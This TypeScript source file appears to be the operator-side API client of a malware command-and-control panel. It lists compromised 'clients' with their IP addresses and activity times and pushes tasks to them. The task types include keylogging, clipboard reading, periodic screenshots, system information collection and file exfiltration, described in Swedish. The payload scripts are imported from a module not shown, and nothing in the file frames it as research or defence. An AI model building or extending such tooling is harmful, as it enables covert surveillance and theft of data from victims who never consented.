
import { INSTRUCTION_CODE } from './scriptData';

// Interface definitions
export interface ScriptsData {
  [key: string]: string;
}

export interface InstructionType {
  id: string;
  name: string;
  description: string;
  code: string;
}

export interface ClientInstruction {
  id: string;
  name?: string;
  system?: string;
  currentInstruction?: string;
  instruction?: string;
  lastActivity?: string;
  last_activity?: string;
  lastSeen?: string;
  isActive?: boolean;
  ip?: string;
  public_ip?: string;
  privateIp?: string;
  private_ip?: string;
  firstSeen?: string;
  first_seen?: string;
  [key: string]: any;
}

// More descriptive instruction descriptions
const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
  "standard": "Standardinstruktion för klippbordsavläsning",
  "keylogger": "Registrerar tangentbordstryckningar",
  "screenshot": "Tar skärmdumpar periodiskt",
  "system_info": "Samlar in systeminformation",
  "file_exfiltration": "Söker och skickar specifika filer"
};

// Server configuration - Update to use local development server when running locally
// and the production server when deployed
const isDevelopment = window.location.hostname === 'localhost' || 
                      window.location.hostname === '127.0.0.1';

// In development, use local Flask server, in production use configured domain
const SERVER_BASE_URL = isDevelopment 
  ? 'http://localhost:8000'
  : (window.location.protocol + '//' + window.location.hostname);

// API Endpoints
const API_CLIENTS_ENDPOINT = '/api/clients';
const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
const API_CONFIG_ENDPOINT = '/api/get_config';
const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
// Legacy endpoint for backward compatibility
const API_GET_INSTRUCTIONS_ENDPOINT = '/get_instructions';

// Authentication token - Not needed for local development server
const AUTH_TOKEN = '';

// Function to log all client communication for debugging
function logClientCommunication(direction: 'SENT' | 'RECEIVED', endpoint: string, data: any, status?: number, error?: Error) {
  const timestamp = new Date().toISOString();
  let logEntry = `[${timestamp}] ${direction} | ENDPOINT: ${endpoint}`;
  
  if (status !== undefined) {
    logEntry += ` | STATUS: ${status}`;
  }
  
  if (data) {
    if (data instanceof ArrayBuffer) {
      logEntry += ` | DATA: [Binary data of length ${data.byteLength}]`;
    } else if (typeof data === 'object') {
      try {
        logEntry += ` | DATA: ${JSON.stringify(data)}`;
      } catch (e) {
        logEntry += ` | DATA: [Object that couldn't be stringified]`;
      }
    } else {
      logEntry += ` | DATA: ${data}`;
    }
  }
  
  if (error) {
    logEntry += ` | ERROR: ${error.message}\n${error.stack}`;
  }
  
  // Log to console for browser debugging
  console.debug(`CLIENT-COMM: ${logEntry}`);
}

// Extract scripts from instructions.py
export async function extractScriptsFromInstructionsPy(): Promise<ScriptsData> {
  // This function is a fallback when API calls fail
  try {
    console.log("Using local instruction code from scriptData.ts");
    return INSTRUCTION_CODE;
  } catch (error) {
    console.error("Error extracting scripts:", error);
    return {
      "standard": "# Standard instruktioner - logga tangenttryckningar",
      "keylogger": "# Instruktion: Keylogger-läge",
      "screenshot": "# Instruktion: Screenshot-läge",
      "system_info": "# Instruktion: System Info-läge",
      "file_exfiltration": "# Instruktion: File Exfiltration-läge",
    };
  }
}

/**
 * Get scripts data from API
 * @returns {Promise<ScriptsData>} The scripts data
 */
export async function getScripts(): Promise<ScriptsData> {
  const endpoint = `${SERVER_BASE_URL}${API_INSTRUCTIONS_ENDPOINT}`;
  const headers: HeadersInit = {
    'Accept': 'application/json'
  };
  
  // Only add Authorization header if not in development and token exists
  if (!isDevelopment && AUTH_TOKEN) {
    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
  }
  
  logClientCommunication('SENT', endpoint, { headers });
  
  try {
    console.log("Fetching instructions from API:", endpoint);
    
    const response = await fetch(endpoint, {
      headers
    });
    
    if (!response.ok) {
      const error = new Error(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`Failed to fetch scripts: ${response.status} ${response.statusText}`);
      throw error;
    }
    
    try {
      const data = await response.json();
      logClientCommunication('RECEIVED', endpoint, data, response.status);
      console.log("Successfully fetched instruction data:", data);
      return data;
    } catch (error) {
      logClientCommunication('RECEIVED', endpoint, 'non-JSON response', response.status, error as Error);
      console.warn("API returned non-JSON response, falling back to local data");
      throw new Error("API returned non-JSON response");
    }
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching scripts, using fallback data:", error);
    
    // Fallback to local instruction code
    return extractScriptsFromInstructionsPy();
  }
}

// Get client instructions using the legacy endpoint (for backward compatibility)
export async function getClientInstructions(clientId: string): Promise<string | null> {
  const endpoint = `${SERVER_BASE_URL}${API_GET_INSTRUCTIONS_ENDPOINT}?client_id=${clientId}`;
  const headers: HeadersInit = {
    'Accept': 'text/plain'
  };
  
  // Only add Authorization header if not in development and token exists
  if (!isDevelopment && AUTH_TOKEN) {
    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
  }
  
  logClientCommunication('SENT', endpoint, { headers });
  
  try {
    console.log(`Fetching instructions for client ${clientId} using legacy endpoint`);
    
    const response = await fetch(endpoint, {
      headers
    });
    
    if (!response.ok) {
      const error = new Error(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
      throw error;
    }
    
    const data = await response.text();
    logClientCommunication('RECEIVED', endpoint, `Text data of length ${data.length}`, response.status);
    console.log(`Successfully received text data from server for client ${clientId}`);
    
    // Return the raw text data
    return data;
    
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error(`Error fetching instructions for client ${clientId}:`, error);
    return null;
  }
}

// Get all available instruction types
export async function getInstructionTypes(): Promise<InstructionType[]> {
  try {
    // First try to get from API
    const scripts = await getScripts();
    
    return Object.keys(scripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: scripts[key]
    }));
  } catch (error) {
    console.error("Error getting instruction types:", error);
    // Fallback to local data
    const fallbackScripts = await extractScriptsFromInstructionsPy();
    
    return Object.keys(fallbackScripts).map(key => ({
      id: key,
      name: key.charAt(0).toUpperCase() + key.slice(1).replace(/_/g, ' '),
      description: INSTRUCTION_DESCRIPTIONS[key] || key,
      code: fallbackScripts[key]
    }));
  }
}

// Get all clients and their current instructions
export async function getClients(): Promise<ClientInstruction[]> {
  const endpoint = `${SERVER_BASE_URL}${API_CLIENTS_ENDPOINT}`;
  const headers: HeadersInit = {
    'Accept': 'application/json'
  };
  
  // Only add Authorization header if not in development and token exists
  if (!isDevelopment && AUTH_TOKEN) {
    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
  }
  
  logClientCommunication('SENT', endpoint, { headers });
  
  try {
    console.log("Fetching clients from API:", endpoint);
    
    const response = await fetch(endpoint, {
      headers
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully fetched client data:", data);
    return data;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching clients:", error);
    // Return empty array on error
    return [];
  }
}

// Update a client's instruction
export async function updateClientInstruction(clientId: string, instructionId: string): Promise<boolean> {
  const endpoint = `${SERVER_BASE_URL}${API_CLIENT_INSTRUCTION_ENDPOINT.replace('{clientId}', clientId)}`;
  const requestBody = { instruction: instructionId };
  
  const headers: HeadersInit = {
    'Content-Type': 'application/json',
    'Accept': 'application/json'
  };
  
  // Only add Authorization header if not in development and token exists
  if (!isDevelopment && AUTH_TOKEN) {
    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
  }
  
  logClientCommunication('SENT', endpoint, requestBody);
  
  try {
    console.log(`Updating client ${clientId} with instruction ${instructionId}`);
    
    const response = await fetch(endpoint, {
      method: 'PUT',
      headers,
      body: JSON.stringify(requestBody),
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully updated client instruction");
    return true;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error updating client instruction:", error);
    return false;
  }
}

// Get server configuration
export async function getServerConfig() {
  const endpoint = `${SERVER_BASE_URL}${API_CONFIG_ENDPOINT}`;
  const headers: HeadersInit = {
    'Accept': 'application/json'
  };
  
  // Only add Authorization header if not in development and token exists
  if (!isDevelopment && AUTH_TOKEN) {
    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
  }
  
  logClientCommunication('SENT', endpoint, { headers });
  
  try {
    console.log("Fetching server config from API:", endpoint);
    
    const response = await fetch(endpoint, {
      headers
    });
    
    if (!response.ok) {
      const error = new Error(`HTTP error! status: ${response.status}`);
      logClientCommunication('RECEIVED', endpoint, null, response.status, error);
      console.warn(`HTTP error! status: ${response.status}`);
      throw error;
    }
    
    const data = await response.json();
    logClientCommunication('RECEIVED', endpoint, data, response.status);
    console.log("Successfully fetched server config:", data);
    return data;
  } catch (error) {
    logClientCommunication('RECEIVED', endpoint, null, 0, error as Error);
    console.error("Error fetching server config:", error);
    // Return null on error
    return null;
  }
}
